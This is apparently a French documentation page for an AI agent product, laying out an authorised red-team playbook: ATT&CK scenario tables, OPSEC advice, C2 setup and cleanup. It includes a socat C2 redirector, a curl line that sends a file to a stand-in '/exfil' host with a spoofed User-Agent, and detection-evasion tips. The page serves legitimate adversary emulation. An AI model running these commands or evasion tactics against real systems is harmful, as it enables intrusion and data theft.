---
id: red-team-playbook
title: "Playbook Red Team avec Indagis Agent"
sidebar_position: 7
description: "Émulation d'adversaire pour évaluer les défenses : planification, exécution, OPSEC et reporting avec MITRE ATT&CK, Atomic Red Team et Caldera."
---

# Playbook Red Team avec Indagis Agent

Cette page présente l'utilisation d'Indagis Agent pour des opérations Red Team, c'est-à-dire l'émulation contrôlée d'un adversaire afin d'évaluer la posture défensive d'une organisation. Elle couvre la planification, l'exécution, l'OPSEC et le reporting.

:::warning Autorisation écrite obligatoire
Le Red Team est un test d'intrusion avancé. Il requiert une autorisation explicite, des règles d'engagement détaillées et une procédure de contact d'urgence. Toute action sans autorisation est illégale.
:::

## Planification

La planification Red Team définit l'objectif stratégique, le périmètre, les contraintes, les scénarios et les critères de succès. Indagis Agent peut aider à structurer les règles d'engagement, choisir des techniques MITRE ATT&CK pertinentes, sélectionner des scénarios réalistes (phishing, compromission initiale, latéralisation, exfiltration simulée) et préparer un calendrier avec des points de contrôle.

Les frameworks de référence incluent :

- **MITRE ATT&CK** : matrice des tactiques et techniques adverses.
- **Atomic Red Team** : tests atomiques pour valider la détection.
- **Caldera** : plateforme d'émulation d'adversaire automatisée.
- **MITRE Shield** : techniques de défense active.

OWASP et les CIS Controls complètent ces références pour couvrir les aspects applicatifs et opérationnels.

## Exécution multi-étapes

Un scénario Red Team typique comprend plusieurs phases. Indagis Agent peut orchestrer ou documenter chaque étape.

### Exemple de scénario : accès initial par phishing document

1. **Reconnaissance OSINT** : collecte d'informations sur la cible.
2. **Préparation du vecteur** : création d'un document macro pour un test contrôlé.
3. **Exécution** : déclenchement du payload dans un environnement isolé.
4. **Persistance** : installation d'une tâche planifiée ou d'une clé de registre.
5. **Latéralisation** : mouvement entre machines via des outils légitimes.
6. **Exfiltration simulée** : transfert d'un fichier canari vers une destination contrôlée.
7. **Retrait** : suppression des artefacts et restauration de l'état initial.

```bash
# Exemple de documentation d'un scénario dans Indagis
indagis chat --skill security-red-team \
  "Rédige un playbook Red Team pour un scénario phishing → macro → WMI latéral.
   Inclus les techniques MITRE ATT&CK, les IOC simulés et les points de contrôle."
```

:::warning Payloads contrôlés
Les documents macros ou les exécutables utilisés en Red Team doivent être inoffensifs mais réalistes. Utilisez des canaris, des callbacks vers des serveurs internes, et jamais d'exfiltration réelle de données sensibles.
:::

## OPSEC

L'OPSEC vise à protéger la méthodologie et l'identité de l'équipe Red Team. Indagis Agent peut aider à documenter les indicateurs créés par l'opération, choisir des outils et des techniques adaptés au niveau de maturité défensif, planifier des moyens de retrait et de nettoyage, et anticiper les réponses Blue Team possibles.

:::info Pas de fuite
L'objectif du Red Team est d'évaluer les défenses, pas de tester la résilience de l'équipe juridique. Les communications, les payloads et les rapports doivent rester internes et chiffrés.
:::

## Reporting

Le rapport Red Team doit être utile à la direction et à la Blue Team. Indagis Agent peut structurer le rapport autour de :

- Objectifs et périmètre.
- Chronologie de l'opération.
- Techniques utilisées (mapping MITRE ATT&CK).
- Preuves d'impact.
- Recommandations priorisées.
- Mesures de détection manquées ou réussies.

## Intégration avec Atomic Red Team et Caldera

Atomic Red Team fournit des tests atomiques sous forme de commandes prêtes à l'emploi. Caldera permet d'automatiser des scénarios plus complexes. Indagis Agent peut lister les techniques ATT&CK couvertes par votre corpus de tests, générer des commandes Atomic adaptées au contexte cible, et documenter l'exécution et les résultats.

```bash
# Exemple de test atomique pour la technique T1059.001 (PowerShell)
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

## Scénarios adverses courants

Un playbook Red Team couvre généralement des scénarios de bout en bout. Indagis peut documenter et exécuter ces phases de manière contrôlée.

### Phishing vers exfiltration simulée

| Étape | Technique MITRE ATT&CK | Outil / Méthode |
|---|---|---|
| Reconnaissance OSINT | T1593, T1594 | Sherlock, domain intelligence |
| Préparation du vecteur | T1204.002 | Document macro canari |
| Exécution initiale | T1059.001 | PowerShell encodé |
| Persistance | T1053.005 | Tâche planifiée WMI |
| Évasion | T1027 | Obfuscation de script |
| Latéralisation | T1021.002 | SMB / PsExec interne |
| Exfiltration simulée | T1041 | Fichier canari vers serveur contrôlé |
| Retrait | T1070.004 | Suppression des artefacts |

```bash
# Générer un playbook Red Team complet avec Indagis
indagis chat --skill security-red-team \
  "Crée un playbook Red Team pour le scénario phishing → macro → WMI → latéral SMB.
   Inclus les règles d'engagement, les IOC simulés et un planning de 5 jours."
```

### Supply chain et compromission de développeur

| Étape | Objectif | Détection attendue |
|---|---|---|
| Recrutement OSINT | Identifier les mainteneurs et leurs outils | Alertes sur fuites d'e-mails |
| Typosquatting | Publier un package malveillant simulé | Monitoring des packages internes |
| CI/CD poison | Modifier un pipeline de build | Hooks sur changements de `.github/workflows` |
| Backdoor logicielle | Injecter une fonction discrète | SAST, revue de code, SBOM |

## Infrastructure et OPSEC avancés

L'OPSEC couvre les serveurs C2, les domaines, les certificats, les canaux de communication et le nettoyage.

```bash
# Exemple de vérification des indicateurs créés par l'opération
# Lister les domaines enregistrés pour le Red Team
whois redteam-example.com
# Vérifier la résolution DNS
nslookup canary.redteam-example.com
# Contrôler les certificats TLS
curl -vI https://canary.redteam-example.com 2>&1 | grep -E '(subject|issuer|expire)'
```

| Indicateur | Contrôle | Outil |
|---|---|---|
| Domaines de C2 | Enregistrement avec privacy | Gandi, Namecheap |
| Certificats TLS | Let's Encrypt ou certificat acheté | certbot, OpenSSL |
| User-Agent | Mimétisme d'application légitime | curl -A, Python requests |
| JA3 / JA4 | Éviter les signatures d'outils d'attaque | Sockets personnalisés, TLS modifié |
| Watermarking | Marquer les payloads pour attribution | Chaîne unique dans les canaris |

## Mise en place d'un C2 contrôlé

Pour un scénario réaliste, l'équipe Red Team utilise souvent un C2 interne ou un redirecteur vers un serveur contrôlé.

```bash
# Exemple de redirecteur C2 minimal avec socat
socat TCP4-LISTEN:443,fork TCP4:10.0.0.50:8443

# Générer un canari de preuve d'exécution
python3 -c "import uuid; print(uuid.uuid4())" > /tmp/redteam-canary.txt
# Simuler une exfiltration vers un serveur contrôlé
curl -X POST https://canary.redteam-example.com/exfil \
  -H "User-Agent: Mozilla/5.0" \
  --data-binary @/tmp/redteam-canary.txt
```

:::warning C2 interne uniquement
Les redirecteurs et C2 doivent être hébergés sur l'infrastructure de l'organisation cible ou un environnement de test contrôlé. Aucun C2 externe non autorisé.
:::

## Checklist Red Team

- [ ] Autorisation écrite, périmètre et règles d'engagement signés.
- [ ] Blue Team informée du créneau (optionnel selon le type d'opération).
- [ ] Scénarios alignés sur les objectifs métier et les menaces réelles.
- [ ] IOC simulés définis et traçables.
- [ ] Canaris de preuve d'impact préparés.
- [ ] Procédure de retrait et de restauration documentée.
- [ ] Canal de communication sécurisé avec l'équipe.
- [ ] Rapport structuré avec mapping MITRE ATT&CK.

## Automatisation avec skills, hooks et subagents

Indagis étend le Red Team par :

- **`security-red-team`** : orchestration des scénarios.
- **`research-osint-investigation`** : reconnaissance initiale.
- **`security-web-pentest`** : vecteurs d'accès initial.
- **`security-godmode`** : automatisation avancée.
- **`hooks`** : déclenchement d'étapes à des heures précises ou sur des événements.
- **`subagent-driven-development`** : délégation de phases (OSINT, infra, reporting).

```bash
# Exemple de hook pour exécuter un test atomique à 02:00
indagis chat \
  "Crée un hook qui exécute Invoke-AtomicTest T1053.005 à 02:00 du matin
   et envoie le résultat dans le canal #redteam."
```

## Anti-patterns Red Team

| Anti-pattern | Risque | Bonne pratique |
|---|---|---|
| Exfiltration réelle de données | Violation RGPD / légale | Utiliser des canaris sans données réelles. |
| C2 externe sans contrôle | Perte de maîtrise | Héberger le C2 dans le périmètre autorisé. |
| Opérer sans point de contact | Impossibilité d'arrêt | Garder un canal ouvert avec le RSSI. |
| Négliger le nettoyage | Artefacts détectables | Script de retrait et snapshot initial. |

## Exercices Purple Team

Le Purple Team rapproche Red Team et Blue Team pour améliorer les détections. Indagis peut servir d'interface entre les deux équipes en documentant les tests, les attentes de détection et les résultats.

| Phase | Red Team | Blue Team | Indagis |
|---|---|---|---|
| Planification | Propose une technique ATT&CK | Valide la couverture SIEM/EDR | Génère le planning et les règles |
| Exécution | Lance le test atomique | Observe les alertes | Capture les logs et les timestamps |
| Analyse | Confirme l'exécution | Liste les déclencheurs manquants | Corrige les règles de détection |
| Amélioration | Valide le contournement | Met à jour les règles | Documente le cycle |

```bash
# Exemple de session Purple Team documentée avec Indagis
indagis chat --skill security-red-team \
  "Documente un exercice Purple Team sur la technique T1059.001 :
   test atomique exécuté, alertes attendues, alertes manquantes,
   et règles Sigma proposées pour combler les lacunes."
```

## Métriques Red Team

Les opérations Red Team se mesurent par leur utilité défensive, pas par le nombre de systèmes compromis.

| Métrique | Usage |
|---|---|
| Temps de détection (TTD) | Temps entre exécution et alerte Blue Team |
| Temps de réponse (TTR) | Temps entre alerte et containment |
| Taux de techniques détectées | Couverture MITRE ATT&CK par le SOC |
| Faux négatifs identifiés | Amélioration des règles |
| Nombre de canaris atteints | Preuve d'impact contrôlé |

## Retrait et restauration

La fin d'une opération Red Team est aussi importante que son début. Indagis peut générer un script de retrait qui liste les artefacts à supprimer.

```bash
# Exemple de script de retrait (à adapter au contexte)
# Supprimer les tâches planifiées créées
schtasks /delete /tn "RedTeamTask" /f
# Supprimer les clés de registre de persistance
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RedTeam /f
# Supprimer les fichiers canaris
Remove-Item -Path C:\Users\redteam\canary.txt -Force
# Restaurer le snapshot VM
```

Chaque action de retrait doit être documentée et validée par un membre de l'équipe.

## Ressources pour aller plus loin

- [MITRE ATT&CK](https://attack.mitre.org)
- [Atomic Red Team](https://atomicredteam.io)
- [Caldera](https://caldera.mitre.org)
- [MITRE D3FEND](https://d3fend.mitre.org)
- [BCOP Blue Team](https://github.com/0xanalyst/BCop)

## Skills Indagis recommandés

| Skill | Rôle dans le Red Team |
|-------|-----------------------|
| `security-red-team` | Orchestration des scénarios adverses |
| `research-osint-investigation` | Reconnaissance initiale |
| `security-web-pentest` | Vecteurs d'accès initial |
| `security-godmode` | Automatisation avancée |
| `documentation-and-adrs` | Rédaction du rapport et des playbooks |

## Pour aller plus loin

- [Skills Indagis](/docs/user-guide/features/skills)
- [MCP servers](/docs/user-guide/features/mcp)
- [Mémoire persistante](/docs/user-guide/features/memory)
- [Gestion des secrets](/docs/user-guide/secrets)
- [Tests d'intrusion](/docs/cybersecurity/penetration-testing)
- [DFIR Triage](/docs/cybersecurity/dfir-triage)
- [Commandes CLI](/docs/reference/cli-commands)

